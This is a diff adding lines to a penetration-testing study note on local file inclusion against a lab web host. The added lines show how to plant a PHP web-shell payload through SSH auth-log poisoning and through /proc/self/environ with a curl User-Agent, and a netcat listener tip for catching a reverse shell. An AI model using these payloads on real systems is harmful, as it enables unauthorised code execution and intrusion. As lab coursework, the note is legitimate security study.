@@ -76,6 +76,7 @@ flowchart TD
 > - Page returns blank / "failed to open stream" → wrong path or file doesn't exist; adjust depth.
 > - PHP wrapper `data://` fails → needs `allow_url_include=On` (often off). Use log poisoning instead.
 > - Reverse shell in `cmd=` won't fire → URL-encode `&` as `%26` and spaces; test `cmd=id` first.
+> - Reverse shell never connects even though `cmd=id` worked → start `nc -nvlp 4444` *before* you request the `cmd=bash -c '...'` payload; the connection attempt is instant and a late listener misses it.
 
 > [!tip] Beginner note — LFI vs Directory Traversal
 > **Traversal** = *read* a file's contents. **LFI** = the file gets *executed/included* by the app. LFI is more powerful because it can lead to code execution. See [[Identifying and exploiting directory traversals]].
@@ -142,6 +143,26 @@ In the following example, our goal is to obtain Remote Code Execution (RCE) via 
 
 > [!info] URL-encode the space
 > Simpler than IFS: replace each space with `%20`, e.g. `&cmd=ls%20-la`, and the command executes correctly.
+
+
+> [!example] Log poisoning via SSH (when the web log isn't readable)
+> If `access.log` isn't reachable but `/var/log/auth.log` is, poison it via a failed SSH login — the username you attempt is logged verbatim, so use it to smuggle the PHP payload:
+> ```sh
+> ssh '<?php system($_GET["cmd"]); ?>'@mountaindesserts.com
+> # the connection will fail (wrong "username") — that's fine, the payload is already in the log
+> ```
+> Then include the auth log through the LFI to trigger it:
+> ```
+> ?page=../../../../var/log/auth.log&cmd=id
+> ```
+
+
+> [!example] Poisoning via /proc/self/environ
+> On older Apache configs running PHP as a module (mod_php, not PHP-FPM), the process environment includes the request headers — so no separate log-poisoning step is needed, since the `User-Agent` you send is already part of the environment about to be included:
+> ```sh
+> curl -A '<?php system($_GET["cmd"]); ?>' "http://mountaindesserts.com/meteor/index.php?page=../../../../proc/self/environ&cmd=id"
+> ```
+> This rarely works on modern PHP-FPM setups — treat it as a fallback if the log paths are unreadable.
 
 
 Upgrade to a reverse shell by passing a Bash TCP one-liner in the `cmd` parameter (update the IP for your lab):
